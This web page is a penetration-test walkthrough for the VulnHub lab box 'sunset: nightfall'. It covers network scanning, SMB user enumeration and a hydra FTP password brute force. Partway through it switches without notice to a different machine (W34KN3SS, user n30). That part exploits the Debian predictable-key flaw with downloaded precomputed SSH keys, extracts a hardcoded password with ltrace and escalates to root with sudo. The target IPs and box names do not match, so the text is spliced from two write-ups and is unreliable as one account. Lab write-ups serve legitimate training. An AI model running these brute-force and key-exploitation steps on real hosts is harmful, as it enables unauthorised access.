<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h3>
            Nightfall&nbsp;&nbsp;&nbsp;&nbsp;  
        </h3>
        <img src="http://placekittens.com/200/300" alt="Hack the Planet" height="50px" width="50px" align="middle" align="left">
        <p class="text">
            The box, nightfall, in the sunset series was created by <a href="https://www.vulnhub.com/author/whitecr0wz,630/">@whitecr0wz</a>.  It was relatively easy, giving good experience for a beginner's enumeration strategy.  Unfortunately, there were a ton of dead ends that tested my patience, but I really enjoyed the privilege escalation method, which I think was unintended.  Let's get started.
            <br><br>
            I began by downloading the torrent from Vulnhub here: <a href="https://www.vulnhub.com/entry/sunset-nightfall,355/">https://www.vulnhub.com/entry/sunset-nightfall,355//</a>.  I took the recommendation of the author to import the file into Virtualbox, adjusted the networking settings, and started the VM.  As always, I looked for new hosts with an IP address on my current subnet using arp-scan.
        </p>
        <pre>
            root@kali:# arp-scan -l
            Interface: eth0, datalink type: EN10MB (Ethernet)
            Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
            192.168.0.189   08:00:27:b5:56:ed   Cadmus Computer Systems
        </pre>
        <p class="text">
            After that, I ran my (bash) enumeration script.  The script can be found here: <a href="https://github.com/caryhooper/scripts/blob/master/enum-automation.sh">enum-automation.sh</a>.  This script automates the nmap scan, checks for common services (right now just HTTP(S) and FTP), and initiates follow-on enumeration programs such as dirb and nikto.  
        </p>
        <pre>
            root@kali:# ./enum-automation.sh 192.168.0.189
            Initial Host Enumeration Script
            by Cary Hooper @nopantrootdance
            [!] Detected HTTP/HTTPS
            [!] Port 80 is a web service
            [!] Port 443 is a web service
                [*] Starting nikto against port 80
                [*] Starting dirb against port 80
                [*] Starting nikto against port 443
                [*] Starting dirb against port 443

            Program Complete
        </pre>
        <p class="text">
            Looking at the nmap scan, we see services running on six ports: 21,22,80,139,445,3306.
        </p>
        <pre>
            Host is up (0.00041s latency).
            Not shown: 65529 closed ports
            PORT     STATE SERVICE       VERSION
            21/tcp   open  ftp           pyftpdlib 1.5.5
            22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10 (protocol 2.0)
            80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
            139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
            445/tcp  open  microsoft-ds?
            3306/tcp open  mysql         MySQL 5.5.5-10.3.15-MariaDB-1
            MAC Address: 08:00:27:B5:56:ED (Oracle VirtualBox virtual NIC)
            Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
        </pre>
        <p class="text">
            Looks like we have another Linux host.  This seems to be a pretty standard stack, except for the FTP service, which I have used in the past.  The python module, pyftpdlib can be used to spin up a quick FTP server for file exfil/download/testing.  You can create a writeable ftp service on port 2121 by using the command: <b>python -m pyftpdlib 2121 -w</b>.<br>
            Next, I began enumeration of the external services.  First, I tried to log in anonymously to FTP, but was unsuccessful.  Next, I took a look at the results of dirb and nikto, but they yielded nothing but a vanilla Apache web server.  I started up dirbuster in the background with my massive directory-busting list.  Next, I ran the perl script, enum4linux to help enumerate the SMB service.  Last, I attempted to connect to the MySQL service with no password.  I was only able to glean usable information from the enum4linux output (truncated):
        <pre>
            cat enum4linux 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 17 16:41:45 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.183
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''

 ========================================== 
|    Share Enumeration on 192.168.0.183    |
 ========================================== 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    WORKGROUP            NIGHTFALL

[+] Password Info for Domain: NIGHTFALL

    [+] Minimum password length: 5
    [+] Password history length: None
    [+] Maximum password age: 37 days 6 hours 21 minutes 
    [+] Password Complexity Flags: 000000

        [+] Domain Refuse Password Change: 0
        [+] Domain Password Store Cleartext: 0
        [+] Domain Password Lockout Admins: 0
        [+] Domain Password No Clear Change: 0
        [+] Domain Password No Anon Change: 0
        [+] Domain Password Complex: 0

    [+] Minimum password age: None
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)

enum4linux complete on Tue Sep 17 16:42:37 2019
        </pre>
        <p class=text>
        The tool, enum4linux utilizes some well-known techniques to learn about a server hosting SMB.  In the output above, we learn the password policy of the host!  This is conducted by connecting to a null session ($IPC).  Next, we can see it actually enumerates users!  This is done by SID brute-forcing.  The tool queries the server for users assigned a certain SID.  Usually, SIDs are reserved for Windows users, but due to compatibility issues between Linux and Windows hosts, Samba servers typically assign SIDs to users.<br>
        As my directory busting was whirring in the background, I was out of options.  I don't usually like to try and brute-force passwords, but I felt it was my only option. The password policy was incredibly loose as well (minimum 5 characters for a password).  Of the four external services allowing authentication (FTP,SSH,SMB,MySQL), I selected FTP.  SSH and SMB are typically slower and limit the login attempt rate.  MySQL often uses different username/password pairs than the system.  Therefore, I used hydra to brute-force the passwords.  I loaded "matt" and "nightfall" into a file called users.txt and ran the following:
        </p>
        <pre>
            root@kali:# hydra -vV -L users.txt -P passwords.txt ftp://192.168.0.189

            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-19 05:42:10
            [DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
            [DATA] attacking ftp://192.168.0.189:21/
            [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
            [ATTEMPT] target 192.168.0.189 - login "matt" - pass "cheese" - 1 of 2 [child 0] (0/0)
            [ATTEMPT] target 192.168.0.189 - login "nightfall" - pass "cheese" - 2 of 2 [child 1] (0/0)
            [21][ftp] host: 192.168.0.189   login: <b>matt</b>   password: <b>cheese</b>
            [STATUS] attack finished for 192.168.0.189 (waiting for children to complete tests)
        </pre>
        <p class=text>
            Any password list will do for this attack.  I prefer to use the one in the Passwords directory of Daniel Miessler's repository, <a href="https://github.com/danielmiessler/SecLists">SecLists</a>. As you can see from the output above, we have found matt's password.  Next, I tried logging into each of the other services with these newfound credentials and found the following information:
            <h4>FTP</h4>
            <ul>
                <li>FTP root was writable.</li>
                <li>FTP root appeared to be matt's home directory (/home/matt).</li>
                <li>ftp 192.168.0.189</li>
            </ul>
            <h4>SSH</h4>
            <ul>
                <li>SSH did not allow login with matt:cheese</li>
                <li>When logging in, I recieved a "password denied" error.</li>
                <li>ssh matt@192.168.0.189</li>
            </ul>
            <h4>SMB</h4>
            <ul>
                <li>An anonymous enum4linux showed there were no available shares.</li>
                <li>Connecting as matt confirmed this fact.</li>
                <li>smbclient -L NIGHTFALL -I 192.168.0.189 -U matt</li>
            </ul>
            <h4>MySQL</h4>
            <ul>
                <li>Access denied to DB as root user and as matt (both with and without passwords)</li>
                <li>mysql -h 192.168.0.189 -u root -p</li>
            </ul>
            <br>
            By this time, dirbuster had finished and found no new directories or content. :(<br>
            After this enumeration, 






            I wasn't sure exactly what to do next, so I searched on google for "deriving public key into private key" and "spoof public key ssh", but got no hits.  Finally, I searched for weaknesses in openssl 0.9.8c-1 and found the following: <a href="https://www.exploit-db.com/exploits/5720">https://www.exploit-db.com/exploits/5720</a>.  I remembered exploiting this weakness elsewhere (I wonder if that's where Amman got it from?).  Its documented in CVE-2008-0166, which outlines a vulnerability in Debian-based operating systems' random number generators.  This resulted in predictable random numbers and allowed attackers to brute-force derived keys.  So we're going to brute force the RSA key. I download the repository of created keys (trading hard drive space for time here), search for this public key and see if was able to be brute-forced. 
        </p>
        <pre>
            root@kali:# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
            root@kali:# tar xvjf 5622.tar.bz2
            root@kali:# grep -r "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw==" .
            ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub:ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
        </pre>
        <p class=text>
            Great! Now we found a public/private key pair that match and may have a shell shortly.  Now, our only issue is that we don't know of a username.  No problem.  We can brute that...
        </p>
        <pre>
            root@kali:# cp ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537 id_rsa
            root@kali:# chmod 400 id_rsa
            root@kali:# for i in $(cat users.txt); do ssh -o NumberOfPasswordPrompts=0 $i@192.168.0.121 -i id_rsa; done
            jordan@192.168.0.121: Permission denied (publickey,password).
            amman@192.168.0.121: Permission denied (publickey,password).
            Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

             * Documentation:  https://help.ubuntu.com
             * Management:     https://landscape.canonical.com
             * Support:        https://ubuntu.com/advantage

            Last login: Sat Aug  3 04:17:57 2019 from 192.168.0.117
            n30@W34KN3SS:~$ 
        </pre>
        <p class=text>
            And we're in!  Listing the home directory of n30, we see three things out of the ordinary: user.txt, .sudo_as_admin_successful, and code*.  Thus, we know that this user likely has sudo rights to escalate privilge to root (with <i>sudo su</i>), but we don't know the password.  
        </p>
        <pre>
            n30@W34KN3SS:~$ ll
            total 44
            drwxr-xr-x 5 n30  n30  4096 Aug 14  2018 ./
            drwxr-xr-x 3 root root 4096 May  5  2018 ../
            -rw------- 1 n30  n30    25 Aug 14  2018 .bash_history
            -rw-r--r-- 1 n30  n30   220 May  5  2018 .bash_logout
            -rw-r--r-- 1 n30  n30  3771 May  5  2018 .bashrc
            drwx------ 2 n30  n30  4096 May  5  2018 .cache/
            -rwxrwxr-x 1 n30  n30  1138 May  8  2018 code*
            drwxrwxr-x 3 n30  n30  4096 May  5  2018 .local/
            -rw-r--r-- 1 n30  n30   818 May  7  2018 .profile
            drwxrwxr-x 2 n30  n30  4096 May  5  2018 .ssh/
            -rw-r--r-- 1 n30  n30     0 May  5  2018 .sudo_as_admin_successful
            -rw-rw-r-- 1 n30  n30    33 May  8  2018 user.txt
            n30@W34KN3SS:~$ file code*
            code: python 2.7 byte-compiled
        </pre>
        <p class=text>
            After some basic linux enumeration and poking around for a few minutes, I decided to focus on the "code" file.  I ran the strings command on it, read the file with cat, and then ran the program, but to my surprise, recieved garbage back.  This was unexpected... I thought it was compiled python code. 
        </p>
        <pre>
            n30@W34KN3SS:~$ ./code
            ./code: line 1: $'\003\363\r': command not found
            ./code: line 2: $'^\307\361Zc\004@sX\002dd\001lZdd\001l\001Z\001dd\001l\002Z\002dd\001l\003Z\003d\002j\004e\002j\005\203\203\001GHd\003GHd\004GHd\005Z\006e\006e\ae\bd\006\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\b\203\001\203\0017Z\006e\006e\ae\bd': command not found
            ./code: line 3: $'\203\001\203\0017Z\006e\006e\ae\bd\v\203\001\203\0017Z\006e\006e\ae\bd\f\203\001\203\0017Z\006e\006e\ae\bd\r\203\001\203\0017Z\006e\006e\ae\bd\016\203\001\203\0017Z\006e\006e\ae\bd\017\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\003j': command not found
            ./code: line 4: syntax error near unexpected token `$'\025i\377\377\377\377Ns\032[+]System''
            ./code: line 4: `�Z
                               dje
                                  �GHdGHdS(i����Ns�[+]System Started at : {0}sG[+]This binary should generate unique hash for the hardcoded login infos[+]Generating the hash ..ttnt3t0t:tdtMtAtStDtNtBt!t#s[+]Your new hash is : {0}s[+]Done(
                    tostsocketttimethashlibtformattctimetinftchrtordtsha256t    hexdigestthashf(((scode.py&lt;module&gt;s&gt;
        </pre>
        <p class=text>
            I didn't know exactly how to run python byte code, but I figured it was a python versioning error.  I had seen some of these encoding/output issues before.  So I tried to run the byte code by explicitly invoking python2.  This seemed to work.
        </p>
        <pre>
            n30@W34KN3SS:~$ python2 code
            [+]System Started at : Sat Aug  3 04:27:53 2019
            [+]This binary should generate unique hash for the hardcoded login info
            [+]Generating the hash ..
            [+]Your new hash is : 794d4cb07d0dbbf61df0415ff4a8684ce2f8d04b663bd5893fb198e512a82354
            [+]Done
        </pre>
        <p class=text>
            So contextual clues indicate that some sort of hash is being generated for "hardcoded" login info.  I can only assume this is a hash of credentials for my current user, n30.  I attempted to crack this hash using hashcat, but could not.  There must be another way.  If the program is generating a hash and it is not being ran with higher privileges, then it must be contained within the program. But how can I access it?  I knew I'd need to start debugging the python bytecode.  There's probably a way to do this within python or gdb, however, I preferred to take a look with ltrace before I jumped off the deep end.  According to teh man page, ltrace is a "library call tracer". I learned about it and strace in one of the Over The Wire labs.  I ran ltrace on the program, then piped the output to a file so that it was more easily greppable.  At first, it looked like the output was too long, but on a whim, I grepped for n30.  At the bottom of the output, I found my answer.
        </p>
        <pre>
           n30@W34KN3SS:~$ ltrace python code >/dev/null 2> code.ltrace
           n30@W34KN3SS:~$ cat code.ltrace  | grep n30
           ... &lt;SNIP&gt; ...
           memcpy(0x7f77acc70734, "n30:dMASDNB!!#B!#!#33", 21) = 0x7f77acc70734
        </pre>
        <p class=text>
            This last line appeared to be a memcopy function just before the hash was returned at the end of the program.  I assumed it was the value that was hashed and salted.  To check, I attempted to list my sudo privileges with <i>sudo -l</i>.  As expected, the user n30 may use sudo for any command.  With that, I was root, had full control of the VM, and was able to read the root flag.  Great box Amman!  
        </p>
        <pre>
            n30@W34KN3SS:~$ sudo -l 
            [sudo] password for n30: 
            Matching Defaults entries for n30 on W34KN3SS:
                env_reset, mail_badpass,
                secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

            User n30 may run the following commands on W34KN3SS:
                (ALL : ALL) ALL
            n30@W34KN3SS:~$ sudo su
            root@W34KN3SS:/home/n30# id
            uid=0(root) gid=0(root) groups=0(root)
        </pre>
        <p class=text>

        </p>

        <br>
    </div>


</body>
<?php include '../footer.php';?>
</html>